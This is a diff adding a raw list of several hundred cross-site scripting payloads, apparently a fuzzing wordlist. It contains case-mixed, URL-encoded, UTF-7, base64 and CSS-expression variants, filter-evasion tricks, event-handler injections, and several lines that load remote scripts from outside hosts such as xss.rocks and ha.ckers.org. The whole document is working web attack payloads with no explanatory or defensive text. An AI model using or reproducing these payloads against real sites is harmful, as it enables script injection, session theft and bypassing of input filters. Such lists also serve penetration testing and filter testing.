@@ -1,0 +1,800 @@
+>\"<iframe%20src=http:%2f%2fvulnerability-lab%2ecom><%2fiframe>
+<STYLE>.XSS{background-image:url(\"javascript:alert('XSS')\") ; }< / STYLE><A CLASS = XSS>< / A>
+-1<IfRaMe sRc=\"JaVaScRiPt:dOcUmEnT.CoOkIe=tRuE;>
+<DiV DaTaFlD=\"b\" DaTaFoRmAtAs=\"HtMl\" DaTaSrC=\"#X\"></dIv> ]]> [a][A]ScRiPt>dOcUmEnT.CoOkIe=tRuE;[a][A]/sCrIpT>
+<MeTa hTtP-EqUiV=\"lInK\" cOnTeNt=\"<hTtP://VuLnErAbIlItY-LaB.CoM/CrOsSsItEsCrIpTiNg.cSs>; rEl=sTyLeShEeT\">
+-1<ImG SrC=\"jAvAsCrIpT:DoCuMeNt.cOoKiE=TrUe;\">
+-1<xml id=\"crosssitescripting\"><i><b><img src=\"javas<!-- -->cript:document.cookie=true\"></b></i></xml><span datasrc=\"#crosssitescripting\" datafld=\"b\" dataformatas=\"html\"></span>
+<ImG SrC=\" &#14; JaVaScRiPt:aLeRt('XsS');\">
+<DIV STYLE = \"background-image: url(javascript:alert('XSS'))\">
+function,[{}][0]%2econstructor%2e_('alert(1)')()<%2fscript>
+<bgsound id = xss src = \"javascript:alert('xss') ; \">
+<?xml:namespace prefix = \"t\" ns = \"urn:schemas-microsoft-com:time\">
+<LaYeR SrC=\"hTtP://XsS.RoCkS/ScRiPtLeT.HtMl\"></LaYeR>
+<!--#exec cmd = \" / bin / echo '<script src'\"--><!--#exec cmd = \" / bin / echo ' = http: /  / ha.ckers.org / xss.js>< / script>'\"-->
+>\"<img dynsrc=\"javascript:document.cookie=true;\">
+<script>alert('xss');</script>
+<style type=\"text/javascript\">alert('xss');</style>
+<HeAd><MeTa hTtP-EqUiV=\"cOnTeNt-tYpE\" cOnTeNt=\"TeXt/hTmL; cHaRsEt=uTf-7\"> </hEaD>+aDw-sCrIpT+Ad4-AlErT('cRoSsSiTeScRiPtInG');+aDw-/ScRiPt+aD4-
+\"x\"%20onerror=\"alert(1)\"><%2fpicture>
+>\"<script>document.cookie=true;//--></script>
+<div%20style=\"width:%20expression(document%2ecookie=true;);\">
+<ImG SrC=\"bLaH\"OnMoUsEoVeR=\"dOcUmEnT.CoOkIe=tRuE;\">
+<StYlE>@iM\\\\pOrT'\\\\Ja aSc iPt:aLeRt(\"XsS\")';</sTyLe>
+>\"<iframe%20src=http:%2f%2fvulnerability-lab%2ecom%2f>@gmail%2ecom
+>\"<DiV DaTaFlD=\"b\" DaTaFoRmAtAs=\"HtMl\" DaTaSrC=\"#X\"></dIv> ]]> [a][A]ScRiPt>dOcUmEnT.CoOkIe=tRuE;[a][A]/sCrIpT>
+<OBJECT TYPE=\"text/x-scriptlet\" DATA=\"http://xss.rocks/scriptlet.html\"></OBJECT>
+<img id = xss src = \"blah>\"onmouseover = \"alert('xss') ; \">
+\"><iframe%20src=a%20onload=alert(\"vl\")%20<
+<ImG SrC=\"jAv aScRiPt:aLeRt('XsS');\">
+<style>li%20{list-style-image:%20url(\"javascript:document%2ecookie=true;\");<%2fstyle><ul><li>crosssitescripting
+<body onload!#$%&()*~+-_.,:;?@[/|\\\\]^`=alert(\"xss\")>
+-1<layer src=\"javascript:document.cookie=true;\"></layer>
+<XmL Id=\"CrOsSsItEsCrIpTiNg\"><i><B><iMg sRc=\"JaVaS<!-- -->cRiPt:dOcUmEnT.CoOkIe=tRuE\"></b></i></xMl><SpAn dAtAsRc=\"#cRoSsSiTeScRiPtInG\" dAtAfLd=\"B\" dAtAfOrMaTaS=\"hTmL\"></sPaN>
+<script>alert(\"xssya\")</script>
+<ImG Id=xSs sRc=\"BlAh\"oNmOuSeOvEr=\"AlErT('xSs');\">
+<xml id=i><x><c><![cdata[<img src=\"javas]]><![cdata[cript:alert('crosssitescripting');\">]]>
+<SCRIPT a=\">\" SRC=\"http://xss.rocks/xss.js\"></SCRIPT>
+<TaBlE><tD BaCkGrOuNd=\"JaVaScRiPt:aLeRt('CrOsSsItEsCrIpTiNg')\">
+<STYLE>BODY{-moz-binding:url(\"http://xss.rocks/xssmoz.xml#xss\")}</STYLE>
+'';!--\"<XSS>=&{()}
+\",,,,,x\" onerror=\"alert(1)\">
+<script%20src=http:%2f%2fvulnerability-lab%2ecom%2fcrosssitescripting%2ejs?<b>
+exp%2f*<xss%20style='no\\\\xss:noxss(\"*%2f%2f*\");
+>\"scriptdocument.cookie = true ;  / script
+\" onfocus = alert(xss) \"> <\"
+\"%20onclick=alert(xss)%20\">
+<img src = \"jav ascript:document.cookie = true ; \">
+<img%20src=\"%20javascript:alert('crosssitescripting');\">
+\\\";AlErT('xSs');//
+-1<style type = \"text / css\">body{background:url(\"javascript:document.cookie = true\")}< / style>
+function,[{}][0].constructor._('alert(1)')()< / script>
+<ImG SrC=JaVaScRiPt:aLeRt('CrOsSsItEsCrIpTiNg')>
+<video%20onerror=\"javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32))\"><source>
+<iframe%20id=xss%20<?php%20echo%20chr(12)?>%20onload=alert(%2fxss%2f)><%2fiframe>
+<LINK%20REL=\"stylesheet\"%20HREF=\"http:%2f%2fxss%2erocks%2fxss%2ecss\">
+>\"<body background = \"javascript:document.cookie = true ; \">
+&{document%2ecookie=true;};
+&<script>alert('xss');</script>\">
+<iframe%20id=xss%20\"onload=alert(%2fxss%2f)><%2fiframe>
+>\"scriptdocument%2ecookie=true;%2fscript
+<img id=xss src=\"javascript:alert('xss');\">
+<?iMpOrT NaMeSpAcE=\"t\" ImPlEmEnTaTiOn=\"#dEfAuLt#tImE2\">
+<img id = xss src = \"livescript:[code]\">
+-1<xml%20id=\"x\"><a><b><script>document%2ecookie=true;<%2fscript>;<%2fb><%2fa><%2fxml>
+list-style:url() onerror = alert(1)>< / li>
+<div style = \"background-image: url(javascript:alert('xss')) ; \">
+<body onload = document.cookie = true ; >
+<script%20src=\"http:%2f%2fvulnerability-lab%2ecom%2fcrosssitescripting%2ejpg\"><%2fscript>
+-1<ImG DyNsRc=\"JaVaScRiPt:dOcUmEnT.CoOkIe=tRuE;\">
+</c></x></xMl><SpAn dAtAsRc=#I DaTaFlD=C DaTaFoRmAtAs=hTmL></SpAn>
+<ScRiPt <B>DoCuMeNt.cOoKiE=TrUe;</sCrIpT>
+>\"<xml id = i><x><c><![cdata[<img src = \"javas]]<![cdata[cript:document.cookie = true ; \">]]< / c>< / x>< / xml><span datasrc = #i datafld = c dataformatas = html>< / span>
+<script>alert(\"xssya\")< / script>
+-1<meta http-equiv = \"refresh\" content = \"0 ; url = javascript:document.cookie = true ; \">
+<xml src=\"crosssitescriptingtest.xml\" id=i></xml><span datasrc=#i datafld=c dataformatas=html></span>
+<style>.xss{background-image:url(\"javascript:alert('xss')\") ; }< / style><a class = xss>< / a>
+eXp/*<xSs sTyLe='No\\\\XsS:NoXsS(\"*//*\");
+<? echo('<scr)' ; echo('ipt>alert(\"crosssitescripting\")< / script>') ;  ?>
+-1<HeAd><MeTa hTtP-EqUiV=\"cOnTeNt-tYpE\" cOnTeNt=\"TeXt/hTmL; cHaRsEt=uTf-7\"> </hEaD>+aDw-sCrIpT+Ad4-DoCuMeNt.cOoKiE=TrUe;+AdW-/sCrIpT+Ad4-
+<script>alert(\"crosssitescripting\")< / script>\" ; ' >
+exp%2f*<a%20style='no\\\\crosssitescripting:nocrosssitescripting(\"*%2f%2f*\");crosssitescripting:ex%2f*crosssitescripting*%2f%2f*%2f*%2fpression(document%2ecookie=true)'>
+<object classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('crosssitescripting')></object>
+dAtA:TeXt/hTmL;ChArSeT=UtF-7;BaSe64,iJ48l3rPdGxLpJxZy3jPcHq+yWxLcNqOmTmZnYk8l3nJcMlWdD4=
+<head><meta%20http-equiv=\"content-type\"%20content=\"text%2fhtml;%20charset=utf-7\">%20<%2fhead>+adw-script+ad4-alert('crosssitescripting');+adw-%2fscript+ad4-
+\"javascript:alert(1)\">clickme< / math>
+<StYlE>@iMpOrT \"dAtA:,*{x:eXpReSsIoN(WrItE(1))}\";</StYlE>
+>\"<object classid=\"clsid:...\" codebase=\"javascript:document.cookie=true;\">
+<BGSOUND%20SRC=\"javascript:alert('XSS');\">
+<img%20src=javascript:alert(\"crosssitescripting\")>\";'%20>
+jAvAsCrIpT:AlErT(1)//></vIdEo>
+\"--><img src=x onerror=alert(1)//\">
+< / script>< / script><<<<script><>>>><<<script>alert(xss)< / script>
+<script>document.cookie=true;//--></script>
+a = \"get\" ; b = \"url(\"\" ; c = \"javascript:\" ; d = \"alert('xss') ; \")\" ; eval(a+b+c+d) ; 
+-1<div style = \"background-image: url(javascript:document.cookie = true ; ) ; \">
+exp / *<XSS STYLE = 'no\\xss:noxss(\"* /  / *\") ; 
+<script>document.write(\"xss\") ; < / script>
+<iframe src = http: /  / vulnerability-lab.com>1337+1
+>\"<iframe src=\"javascript:document.cookie=true;>
+<ImG SrC=JaVaScRiPt:aLeRt(\"CrOsSsItEsCrIpTiNg\")>
+<SCRIPT a = \">\" '' SRC = \"http: /  / xss.rocks / xss.js\">< / SCRIPT>
+<img src = javascript:alert('crosssitescripting')>
+<img src=\"jav ascript:alert('crosssitescripting');\">
+<video><source onerror=\"javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32))\">
+>\"<div%20style=\"binding:%20url([link%20to%20code]);\">
+<object classid = clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name = url value = javascript:alert('xss')>< / object>
+<StYlE TyPe=\"TeXt/jAvAsCrIpT\">aLeRt('XsS');</StYlE>
+<ScRiPt \"A='>'\" sRc=\"HtTp://xSs.rOcKs/xSs.jS\"></sCrIpT>
+>\"<A HrEf=\"JaVaScRiPt#dOcUmEnT.CoOkIe=tRuE;\">
+-1<img lowsrc = \"javascript:document.cookie = true ; \">
+<STYLE TYPE = \"text / javascript\">alert('XSS') ; < / STYLE>
+<SCRIPT%20a=`>`%20SRC=\"http:%2f%2fxss%2erocks%2fxss%2ejs\"><%2fSCRIPT>
+<StYlE><!--</StYlE><sCrIpT>AlErT('xSs');//--></ScRiPt>
+<img dyn id=xss src=\"javascript:alert('xss')\">
+<ImG Id=xSs sRc=\"MoChA:[cOdE]\">
+>\"<TaBlE BaCkGrOuNd=\"JaVaScRiPt:dOcUmEnT.CoOkIe=tRuE;\">
+>\"<script>document.cookie = true ; < / script>
+<img style=\"crosssitescripting:expr/*crosssitescripting*/ession(alert('crosssitescripting'))\">
+<a href = \"http: /  / www.google.com\">crosssitescripting< / a>
+<iframe%20id=xss%20%2f%20%2fonload=alert(%2fxss%2f)><%2fiframe>
+<BoDy oNlOaD=\"dOcUmEnT.CoOkIe=tRuE;\">
+<table id = xss><td background = \"javascript:alert('xss')\">
+\"TeSt\"></FoRm><BuTtOn fOrM=\"tEsT\" fOrMaCtIoN=\"jAvAsCrIpT:AlErT(1)\">X</bUtToN>
+<img src=\"livescript:document.cookie=true;\">
+<ImG Id=xSs sRc=`JaVaScRiPt:aLeRt(\"RsNaKe sAyS, 'XsS'\")`>
+<div%20onmouseover=\"document%2ecookie=true;\">
+<object type = \"application / x-shockwave-flash\" data = \"http: /  / www.vulnerability-lab.com / hack.swf\" width = \"300\" height = \"300\">
+<meta http-equiv = \"refresh\" content = \"0 ; url = javascript:alert('xss') ; \">
+content:url(data:image / svg+xml,<svg / >) ; visibility:hidden onload = alert(1)>< / div>
+>\"<object classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:document.cookie=true></object>
+-1<HtMl><BoDy><?xMl:nAmEsPaCe pReFiX=\"t\" Ns=\"UrN:ScHeMaS-MiCrOsOfT-CoM:TiMe\"><?ImPoRt nAmEsPaCe=\"T\" iMpLeMeNtAtIoN=\"#DeFaUlT#TiMe2\"><T:SeT AtTrIbUtEnAmE=\"iNnErHtMl\" To=\"CrOsSsItEsCrIpTiNg<sCrIpT DeFeR>DoCuMeNt.cOoKiE=TrUe</ScRiPt>\"></bOdY></HtMl>
+scriptalert(crosssitescripting)/script
+<TaBlE BaCkGrOuNd=\"JaVaScRiPt:dOcUmEnT.CoOkIe=tRuE;\">
+document.getelementbyid(\"div1\").innerhtml;</script>
+iD=XsS SrC= <ImG 6;AvAsCrIpT:AlErT('xSs')>
+\"div1\"><input value = \"``onmouseover = alert(1)\">< / div> <div id = \"div2\">< / div>
+<ObJeCt tYpE=\"tExT/X-ScRiPtLeT\" dAtA=\"hTtP://VuLnErAbIlItY-LaB.CoM/ScRiPtLeT.HtMl\"></ObJeCt>
+<img%20dynid=xss%20src=\"javascript:alert('xss')\">
+-1<br size=\"&{document.cookie=true}\">
+<link%20rel=\"stylesheet\"%20href=\"javascript:alert('crosssitescripting');\">
+<IMG SRC=java%00script:alert(\\\"XSS\\\")>
+<style>@im\\\\port'\\\\ja asc ipt:document.cookie = true' ; < / style>
+<script>alert(document.cookie)< / script><div style = \"1@gmail.com
+>\"<xml id=i><x><c><![cdata[<img src=\"javas]]<![cdata[cript:document.cookie=true;\">]]</c></x></xml><span datasrc=#i datafld=c dataformatas=html></span>
+<layer%20src=\"javascript:document%2ecookie=true;\"><%2flayer>
+<SCRIPT \"a='>'\" SRC=\"http://xss.rocks/xss.js\"></SCRIPT>
+-1<script%20<b>document%2ecookie=true;<%2fscript>
+<script>referenceerror.prototype.__definegetter__('name', function(){alert(1)}),x< / script>
+<? echo('<scr)' ; echo('ipt>alert(\"xss\")< / script>') ;  ?>
+exp%2f*<XSS%20STYLE='no\\xss:noxss(\"*%2f%2f*\");
+<t:set attributename = \"innerhtml\" to = \"crosssitescripting<script defer>alert(\"crosssitescripting\")< / script>\">
+'\"</sCrIpT><sCrIpT>AlErT('xSsYa')</ScRiPt>
+'\"\"><script language=\"javascript\"> alert('x s s');</script>
+width:1px ; filter:glow onfilterchange = alert(1)>x< / div>
+<style type = \"text / javascript\">alert('crosssitescripting') ; < / style>
+<layer%20src=\"http:%2f%2fvulnerability-lab%2ecom%2fscript%2ehtml\"><%2flayer>
+<SCRIPT SRC = http: /  / xss.rocks / xss.js>< / SCRIPT>
+<SvG><sCrIpT>AlErT(/1/)</ScRiPt>
+>\"<XmL Id=\"X\"><A><b><ScRiPt>dOcUmEnT.CoOkIe=tRuE;</ScRiPt>;</B></A></XmL>
+<script>a=/xss/
+<<sCrIpT>AlErT(\"xSs\");//<</ScRiPt>
+>\"<img%20src=&{document%2ecookie=true;};>
+-1<script>document.cookie=true;//<</script>
+<input type = \"image\" src = \"javascript:document.cookie = true ; \">
+<SCRIPT>alert('XSS') ; < / SCRIPT>
+</script></script><<<<script><>>>><<<script>alert(xss)</script>
+>\"<script>alert(document%2ecookie)<%2fscript>@gmail%2ecom
+<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('xss');\">
+<!--[if gte ie 4]> <script>alert('crosssitescripting') ; < / script> <![endif]-->
+<<sCrIpT>DoCuMeNt.cOoKiE=TrUe;</sCrIpT>
+<ScRiPt>dOcUmEnT.WrItE(\"xSs\");</sCrIpT>
+<STYLE>@import'http: /  / xss.rocks / xss.css' ; < / STYLE>
+<FRAMESET><FRAME%20SRC=\"javascript:alert('XSS');\"><%2fFRAMESET>
+<xml id = i><x><c><![cdata[<img src = \"javas]]<![cdata[cript:document.cookie = true ; \">]]< / c>< / x>< / xml><span datasrc = #i datafld = c dataformatas = html>< / span>
+<InPuT Id=xSs oNbLuR=JaVaScRiPt:eVaL(StRiNg['FrOmChArCoDe'](97,108,101,114,116,40,39,120,115,115,39,41,32)) aUtOfOcUs><InPuT AuToFoCuS>
+</script><script>alert(1)</script>
+<input type=\"image\" id=xss src=\"javascript:alert('xss');\">
+<script>a =  / xss / 
+>\"<ImG SrC=\"bLaH>\" OnMoUsEoVeR=\"dOcUmEnT.CoOkIe=tRuE;\">
+<div%20style=\"background-image:%20url(javascript:alert('crosssitescripting'))\">
+<input type = \"image\" dynid = xss src = \"javascript:alert('xss') ; \">
+-1<xml src=\"javascript:document.cookie=true;\">
+<meta http-equiv=\"link\" content=\"<http://ha.ckers.org/xss.css>; rel=stylesheet\">
+-1<? echo('<scr)' ; echo('ipt>document.cookie = true< / script>') ;  ?>
+lIsT-StYlE:UrL() OnErRoR=AlErT(1)></lI>
+content:url(data:image%2fsvg+xml,<svg%2f>);visibility:hidden%20onload=alert(1)><%2fdiv>
+<STYLE%20type=\"text%2fcss\">BODY{background:url(\"javascript:alert('XSS')\")}<%2fSTYLE>
+<div style = \"width: expression(document.cookie = true) ; \">
+>\"<img src = \" javascript:document.cookie = true ; \">
+>\"<ImG SrC=\" JaVaScRiPt:dOcUmEnT.CoOkIe=tRuE;\">
+<img src = \"http: /  / www.vulnerability-lab.com / file.php?variables = malicious\">
+<script%20id=xss%20src=http:%2f%2fha%2eckers%2eorg%2fxss%2ejs><%2fscript>
+<StYlE>@iMpOrT'HtTp://hA.CkErS.OrG/XsS.CsS';</sTyLe>
+\";alert('xss)//
+<style%20type=\"text%2fjavascript\">document%2ecookie=true;<%2fstyle>
+>\"<LiNk rEl=\"StYlEsHeEt\" HrEf=\"JaVaScRiPt:dOcUmEnT.CoOkIe=tRuE;\">
+<a%20href=\"http:%2f%2f1113982867%2f\">crosssitescripting<%2fa>
+<IMG%20SRC='vbscript:msgbox(\"XSS\")'>
+<ScRiPt a=\">\" iD=XsS SrC=\"hTtP://Ha.cKeRs.oRg/xSs.jS\"></sCrIpT>
+<BaSe hReF=\"jAvAsCrIpT:AlErT('xSs');//\">
+>\"<meta http-equiv = \"set-cookie\" content = \"userid = <script>document.cookie = true< / script>\">
+\"data:text/html;base64,phnjcmlwdd5hbgvydcgxktwvc2nyaxb0pg==\"></embed>
+data:text / html ; charset = utf-7 ; base64,ij48l3rpdgxlpjxzy3jpchq+ywxlcnqomtmznyk8l3njcmlwdd4 = 
+<IMG%20SRC=\"%20&#14;%20javascript:alert('XSS');\">
+>\"<ScRiPt>dOcUmEnT.CoOkIe=tRuE;//--></sCrIpT>
+<html><body><?xml:namespace%20prefix=\"t\"%20ns=\"urn:schemas-microsoft-com:time\"><?import%20namespace=\"t\"%20implementation=\"#default#time2\"><t:set%20attributename=\"innerhtml\"%20to=\"xss<script%20defer>alert(\"xss\")<%2fscript>\"><%2fbody><%2fhtml>
+<ScRiPt>a=/XsS/NaLeRt('XsS');</ScRiPt>
+>\"<script>document.cookie=true;//<</script>
+<MeTa hTtP-EqUiV=\"lInK\" cOnTeNt=\"<jAvAsCrIpT:AlErT('xSs')>; rEl=sTyLeShEeT\">
+-1<html><body><?xml:namespace prefix = \"t\" ns = \"urn:schemas-microsoft-com:time\"><?import namespace = \"t\" implementation = \"#default#time2\"><t:set attributename = \"innerhtml\" to = \"crosssitescripting<script defer>document.cookie = true< / script>\">< / body>< / html>
+ & <script>alert('xss') ; < / script>\">
+<CrOsSsItEsCrIpTiNg sTyLe=\"CrOsSsItEsCrIpTiNg:eXpReSsIoN(DoCuMeNt.cOoKiE=TrUe)\">
+>\"</tItLe><ScRiPt>dOcUmEnT.CoOkIe=tRuE;</ScRiPt>
+<ImG DyN Id=xSs sRc=\"JaVaScRiPt:aLeRt('XsS')\">
+&<script>alert('xss');<%2fscript>\">
+<a href = \"javascript#alert('xss') ; \">
+\"<script>alert('xssya')< / script>
+'';!--\"<crosssitescripting>=&{()}
+<iframe src=http://vulnerability-lab.com/>@gmail.com
+<FrAmEsEt><FrAmE SrC=\"jAvAsCrIpT:AlErT('xSs');\"></fRaMeSeT>
+<SCRIPT>a=%2fXSS%2f
+<isindex%20action=j%20a%20vas%20c%20r%20ipt:alert(1)%20type=image>
+<InPuT TyPe=\"ImAgE\" sRc=\"JaVaScRiPt:aLeRt('CrOsSsItEsCrIpTiNg');\">
+<iframe id=xss / /onload=alert(/xss/)></iframe>
+\" onfocus=alert(xss) \"> <\"
+<InPuT TyPe=\"ImAgE\" sRc=\"JaVaScRiPt:dOcUmEnT.CoOkIe=tRuE;\">
+<script a=\">\" id=xss src=\"http://ha.ckers.org/xss.js\"></script>
+;!--\"<xss>=&{()}\"
+<img low id=xss src=\"javascript:alert('xss')\">
+<BaSe hReF=\"jAvAsCrIpT:DoCuMeNt.cOoKiE=TrUe;//\">
+<script%20a=\">\"%20id=xss%20src=\"http:%2f%2fha%2eckers%2eorg%2fxss%2ejs\"><%2fscript>
+<DiV DaTaFlD=\"b\" DaTaFoRmAtAs=\"HtMl\" DaTaId=xSs sRc=\"#xSs\"></DiV>
+<LINK REL = \"stylesheet\" HREF = \"javascript:alert('XSS') ; \">
+-1<object classid=\"clsid:...\" codebase=\"javascript:document.cookie=true;\">
+<IMG LOWSRC = \"javascript:alert('XSS')\">
+<XmL Id=i><X><c><![CdAtA[<iMg sRc=\"JaVaS]]><![cDaTa[cRiPt:aLeRt('CrOsSsItEsCrIpTiNg');\">]]>
+<TABLE BACKGROUND=\"javascript:alert('XSS')\">
+<body%20background=\"javascript:alert('crosssitescripting')\">
+\"javascript:alert(1)\">clickme<%2fmath>
+<XSS STYLE=\"xss:expression(alert('XSS'))\">
+\"alert(1)\"><source></source></video>
+>\"<div%20onmouseover=\"document%2ecookie=true;\">
+<?import%20namespace=\"t\"%20implementation=\"#default#time2\">
+<script src=\"http://vulnerability-lab.com/crosssitescripting.jpg\"></script>
+>\"<DiV StYlE=\"bAcKgRoUnD-ImAgE: uRl(jAvAsCrIpT:DoCuMeNt.cOoKiE=TrUe;);\">
+<IMG SRC = \"jav & #x0A ; ascript:alert('XSS') ; \">
+<IMG%20SRC=\"javascript:alert('XSS');\">
+<a href=\"http://1113982867/\">crosssitescripting</a>
+<SCRIPT a=\">\" '' SRC=\"http://xss.rocks/xss.js\"></SCRIPT>
+<style%20type=\"text%2fjavascript\">alert('crosssitescripting');<%2fstyle>
+<ImG Id=xSs sRc=jAvAsCrIpT:AlErT(\"xSs\")>
+<STYLE type = \"text / css\">BODY{background:url(\"javascript:alert('XSS')\")}< / STYLE>
+-1<div style = \"width: expression(document.cookie = true) ; \">
+>\"<link rel = \"stylesheet\" href = \"javascript:document.cookie = true ; \">
+<style type = \"text / css\">body{background:url(\"javascript:alert('crosssitescripting')\")}< / style>
+<img%20id=xss%20src=\"blah\"onmouseover=\"alert('xss');\">
+<script>alert('xssya');</script>
+>\"<xml id = \"crosssitescripting\"><i><b><img src = \"javas<!-- -->cript:document.cookie = true\">< / b>< / i>< / xml><span datasrc = \"#crosssitescripting\" datafld = \"b\" dataformatas = \"html\">< / span>
+<SCRIPT>alert('XSS');</SCRIPT>
+-1<script>document.cookie = true ;  /  / << / script>
+<ObJeCt cLaSsId=cLsId:aE24fDaE-03C6-11d1-8b76-0080c744f389><pArAm nAmE=UrL VaLuE=JaVaScRiPt:aLeRt('XsS')></ObJeCt>
+>\"<ImG StYlE=\"cRoSsSiTeScRiPtInG:ExPr/*CrOsSsItEsCrIpTiNg*/EsSiOn(dOcUmEnT.CoOkIe=tRuE)\">
++49/>\"<iframe src=http://vulnerability-lab.com>1337
+<IfRaMe sRcDoC=\"<ImG SrC=X:X OnErRoR=AlErT(1)>\" />
+<StYlE>Li {LiSt-sTyLe-iMaGe: UrL(\"jAvAsCrIpT:AlErT('xSs');</sTyLe><Ul><Li>xSs
+<DIV STYLE = \"width: expression(alert('XSS')) ; \">
+<body%20onload=document%2ecookie=true;>
+<style>li {list-style-image: url(\"javascript:document.cookie=true;\");</style><ul><li>crosssitescripting
+<IfRaMe sRc=hTtP://TeSt.dE>
+javascript:alert(1)//></video>
+<svg/onload=confirm(1)>
+<IMG SRC=\"javascript:alert('XSS')\"
+'\"\"><ScRiPt lAnGuAgE=\"jAvAsCrIpT\"> AlErT('x s s');</sCrIpT>
+<DiV StYlE=\"bInDiNg: UrL([lInK To cOdE]);\">
+<scr<script>ipt>alert(1)</scr<script>ipt>
+<img src=\"blah>\" onmouseover=\"document.cookie=true;\">
+-1<img src = \"javascript:document.cookie = true ; \">
+\";aLeRt('CrOsSsItEsCrIpTiNg');//
+>\"<img src = \"livescript:document.cookie = true ; \">
+<script>alert('vl')</script>
+>\"<<script>document%2ecookie=true;<%2fscript>
+<?xMl:nAmEsPaCe pReFiX=\"t\" Ns=\"UrN:ScHeMaS-MiCrOsOfT-CoM:TiMe\">
+<DiV StYlE=\"wIdTh: ExPrEsSiOn(dOcUmEnT.CoOkIe=tRuE);\">
+<br size=\"&{alert('xss')}\">
+>\"<script>document%2ecookie=true;%2f%2f<<%2fscript>
+a=\"GeT\";b=\"UrL\";c=\"JaVaScRiPt:\";d=\"AlErT('xSs');\";eVaL(A+B+C+D);
+<object type=\"text/x-scriptlet\" data=\"http://vulnerability-lab.com/scriptlet.html\"></object>
+<script <b>=alert('xss');\"></script>
+<Br sIzE=\"&{aLeRt('CrOsSsItEsCrIpTiNg')}\">
+<div%20style=\"background-image:%20url(javascript:alert('xss'));\">
+<STYLE>%2eXSS{background-image:url(\"javascript:alert('XSS')\");}<%2fSTYLE><A%20CLASS=XSS><%2fA>
+-1<TaBlE><tD BaCkGrOuNd=\"JaVaScRiPt:dOcUmEnT.CoOkIe=tRuE;\">
+<body background=\"javascript:document.cookie=true;\">
+<ScRiPt sRc=hTtP://XsS.RoCkS/XsS.Js?<B>
+-1<ImG LoWsRc=\"JaVaScRiPt:dOcUmEnT.CoOkIe=tRuE;\">
+<ScRiPt>dOcUmEnT.WrItE(\"<ScRi\");</sCrIpT>Pt sRc=\"HtTp://vUlNeRaBiLiTy-lAb.cOm/cRoSsSiTeScRiPtInG.Js\"></ScRiPt>
+location=?javascript:alert(1)>click
+>\"&<sCrIpT>DoCuMeNt.cOoKiE=TrUe;</sCrIpT>
+\"x:alert\"%20onerror=\"eval(src+'(0)')\">
+<br%20size=\"&{alert('xss')}\">
+<META HTTP-EQUIV = \"refresh\" CONTENT = \"0 ;  URL = http: /  /  ; URL = javascript:alert('XSS') ; \">
+<ImG SrC=\"mOcHa:dOcUmEnT.CoOkIe=tRuE;\">
+>\"<StYlE TyPe=\"TeXt/jAvAsCrIpT\">dOcUmEnT.CoOkIe=tRuE;</StYlE>
+<iframe id=xss src=\"javascript:alert('xss');\"></iframe>
+\"<%2fstyle><img%20src=x%20onerror=alert(1)%2f%2f\">
+<style><!--</style><script>document.cookie=true;//--></script>
+-1<script>document.cookie = true ; < / script>
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+<meta http-equiv=\"link\" content=\"<http://vulnerability-lab.com/crosssitescripting.css>; rel=stylesheet\">
+<StYlE>BoDy{-MoZ-BiNdInG:UrL(\"hTtP://XsS.RoCkS/XsSmOz.xMl#xSs\")}</sTyLe>
+aLeRt(1)>
+-1<script <b>document.cookie=true;</script>
+<xml id = \"x\"><a><b><script>document.cookie = true ; < / script> ; < / b>< / a>< / xml>
+-1<base%20href=\"javascript:document%2ecookie=true;%2f%2f\">
+-1<body onload!#$% & ()*~+-_.,: ; ?@[ /  | \\\\]^` = document.cookie = true ; >
+<SCRIPT SRC=\"http://xss.rocks/xss.jpg\"></SCRIPT>
+<body background=\"javascript:alert('crosssitescripting')\">
+<style%20type=\"text%2fcss\">body{background:url(\"javascript:alert('xss')\")}<%2fstyle>
+\"javascript:alert(1)\"></table>
+\"data:text/html;base64,phnjcmlwdd5hbgvydcgisgvsbg8ikts8l3njcmlwdd4=\">
+<iframe id = xss  /   / onload = alert( / xss / )>< / iframe>
+<frameset><frame%20id=xss%20src=\"javascript:alert('xss');\"><%2fframeset>
+<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+<a href = \"about:<script>document.cookie = true ; < / script>\">
+-1<div%20style=\"background-image:%20url(javascript:document%2ecookie=true;);\">
+-1<body onload=\"document.cookie=true;\">
+<img id=xss src=&{alert('xss');};>
+-1<body onload=document.cookie=true;>
+<style>body{-moz-binding:url(\"http:%2f%2fha%2eckers%2eorg%2fxssmoz%2exml#xss\")}<%2fstyle>
+<meta http-equiv = \"refresh\" content = \"0 ; url = data:text / html ; base64,phnjcmlwdd5hbgvydcgnwfntjyk8l3njcmlwdd4k\">
+>\"<object%20classid=\"clsid:%2e%2e%2e\"%20codebase=\"javascript:document%2ecookie=true;\">
+lOcAtIoN=?jAvAsCrIpT:AlErT(1)>cLiCk
+<SCRIPT%2fXSS%20SRC=\"http:%2f%2fxss%2erocks%2fxss%2ejs\"><%2fSCRIPT>
+<xss style=\"xss:expression(alert('xss'))\">
+<ScRiPt>a=/CrOsSsItEsCrIpTiNg/ AlErT(A.SoUrCe)</sCrIpT>
+>\"<img%20src=\"mocha:document%2ecookie=true;\">
+<img%20id=xss%20src=\"javascript:alert('xss')\"
+-1<style%20type=\"text%2fjavascript\">document%2ecookie=true;<%2fstyle>
+<img%20src=\"javascript:document%2ecookie=true;\">
+<HEAD><META HTTP-EQUIV = \"CONTENT-TYPE\" CONTENT = \"text / html ;  charset = UTF-7\"> < / HEAD>+ADw-SCRIPT+AD4-alert('XSS') ; +ADw- / SCRIPT+AD4-
+<html><body><?xml:namespace prefix = \"t\" ns = \"urn:schemas-microsoft-com:time\"><?import namespace = \"t\" implementation = \"#default#time2\"><t:set attributename = \"innerhtml\" to = \"crosssitescripting<script defer>document.cookie = true< / script>\">< / body>< / html>
+jAvAsCrIpT:AlErT(1)//
+<ScRiPt>dOcUmEnT.CoOkIe=tRuE;//<</sCrIpT>
+scriptdocument.cookie = true ;  / script
+<xml id = i><x><c><![cdata[<img src = \"javas]]><![cdata[cript:alert('crosssitescripting') ; \">]]>
